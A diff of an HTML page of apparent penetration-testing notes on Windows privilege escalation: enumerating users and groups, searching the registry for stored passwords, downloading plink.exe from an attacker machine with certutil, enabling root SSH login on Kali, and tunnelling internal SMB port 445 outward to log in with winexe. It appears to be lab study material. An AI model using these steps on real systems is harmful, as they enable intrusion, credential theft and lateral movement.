@@ -8,10 +8,10 @@
 <br/>
 <span style="font-size: 15pt">To start, we can look for all the users on the machine:<br/>
 <b>net users<br/>
-</b></span><img src="1.png" /><b><span style="font-size: 15pt"><br/>
-</span></b><b><span style="font-size: 15pt"><br/>
+</b></span><img src="1.png" /><span style="font-size: 15pt"><b><br/>
+</b></span><span style="font-size: 15pt"><b><br/>
 <br/>
-</span></b><span style="font-size: 15pt">We can check for our privileges:<br/>
+</b>We can check for our privileges:<br/>
 <b>net user YOUR_USERNAME<br/>
 </b><b>(we are interested in groups like Administrators)</b><br/>
 </span><img src="4.png" /><br/>
@@ -45,5 +45,56 @@ reg query HKCU /f password /t REG_SZ /s<br/>
 <br/>
 <span style="font-size: 15pt">To port forward a port (E.G. the internal SMB) we will use the plink program<br/>
 (Not the Kali one, might get us some issues)<br/>
-<a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html<br/>
-</a></span></body></html>
+</span><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
+
+"><span style="font-size: 15pt">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</span><br/>
+</a><span style="font-size: 15pt">(Remember to download the correct version x86 or x64)<br/>
+</span><img src="1 7.png" /><br/>
+<br/>
+<br/>
+<br/>
+<span style="font-size: 15pt">We can load the plink.exe on the Windows machine using the <b>python/certutil</b>&nbsp;combo:<br/>
+<b>python -m SimpleHTTPServer 80</b><br/>
+or <br/>
+<b>pythom -m http.server<br/>
+certutil -urlcache -f http://IP_ADDRESS/plink.exe plink.exe<br/>
+<br/>
+<br/>
+Another important step is to check if ssh is installed on Kali machine:<br/>
+if not, just install it.<br/>
+</b>Now, edit the ssh config file<b>&nbsp;/etc/ssh/sshd_config<br/>
+</b>we are going to uncomment and change the <b>PermitRootLogin</b>&nbsp;value:<br/>
+<br/>
+Before:<br/>
+<img src="1 8.png" /><br/>
+<b><br/>
+</b></span><br/>
+After:<br/>
+<img src="1 9.png" /><br/>
+<br/>
+<br/>
+<br/>
+<span style="font-size: 15pt">Now, restart ssh:<br/>
+<b>service ssh restart</b><br/>
+or<br/>
+<b>systemctl restart ssh<br/>
+</b></span><img src="1 10.png" /><br/>
+<br/>
+<br/>
+<br/>
+<span style="font-size: 15pt">Run plink on Windows machine:<br/>
+The first port is the local port and the second one is the forward port<br/>
+</span><img src="1 11.png" /><br/>
+<br/>
+<br/>
+<br/>
+<span style="font-size: 15pt">The logic is:<br/>
+<b>Over ssh, we are forwarding an internal port, outside</b><br/>
+Infact, if we do netstat on our Kali machine, we can see the port 445:<br/>
+(try netstat a couple of times if that doesn't show immediatly)<br/>
+</span><img src="1 12.png" width="950" height="130" /><br/>
+<br/>
+<br/>
+<br/>
+<span style="font-size: 15pt">Now, we can try to run winexe for port 445, to login into windows machine:</span><br/>
+<img src="1 13.png" /></body></html>
